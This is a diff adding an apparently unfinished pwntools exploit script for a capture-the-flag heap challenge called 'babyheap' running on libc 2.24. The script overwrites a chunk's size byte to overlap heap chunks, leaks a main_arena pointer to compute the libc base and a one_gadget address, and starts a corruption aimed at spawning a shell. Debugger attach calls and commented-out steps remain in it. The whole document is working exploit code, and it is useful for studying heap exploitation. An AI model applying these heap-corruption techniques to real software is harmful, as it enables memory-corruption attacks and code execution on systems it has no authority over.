@@ -1,0 +1,63 @@
+from pwn import *
+
+context.log_level = 'debug'
+
+sh = process('./babyheap')
+elf = ELF('./babyheap')
+libc = ELF('./libc-2.24.so')
+
+def allocate(size):
+	sh.sendlineafter('Command: ','1')
+	sh.sendlineafter('Size: ',str(size))
+
+def resize(idx,size,con):
+        sh.sendlineafter('Command: ','2')
+        sh.sendlineafter('Index: ',str(idx))
+        sh.sendlineafter('Size: ',str(size))
+	sh.sendlineafter('Content: ',con)
+def delete(idx):
+        sh.sendlineafter('Command: ','3')
+        sh.sendlineafter('Index: ',str(idx))
+
+def show(idx):
+	sh.sendlineafter('Command: ','4')
+        sh.sendlineafter('Index: ',str(idx))
+
+
+
+
+allocate(0x18)
+allocate(0x18)
+allocate(0x48)
+allocate(0x10)
+allocate(0x10)
+
+#---------leak libc addr-------------------------
+resize(0,0x19,'a'*0x18+p8(0x91))
+delete(1)
+allocate(0x18)
+show(2)
+sh.recvuntil(': ')
+leak_addr = u64(sh.recv(8))
+print 'leak_addr: '+hex(leak_addr)
+main_arena = leak_addr- 88
+print 'main_arena: '+hex(main_arena)
+libc_addr = main_arena - 0x3c4b20
+print 'libc_base: '+hex(libc_addr)
+one_gadget = libc_addr + 0x3f35a
+gdb.attach(sh)
+#----------get shell-----------------------------
+allocate(0x58)
+delete(5)
+resize(2,0x10,p64(0x51))
+#resize(5,0x59,'a'*0x58+p8(0x31))
+gdb.attach(sh)
+#resize(1,0x19,'a'*0x18+p8(0x61))
+#delete(2)
+
+#new_top = main_arena - 0x33
+#resize(5,0x8,p64(new_top))
+gdb.attach(sh)
+sh.interactive()
+
+
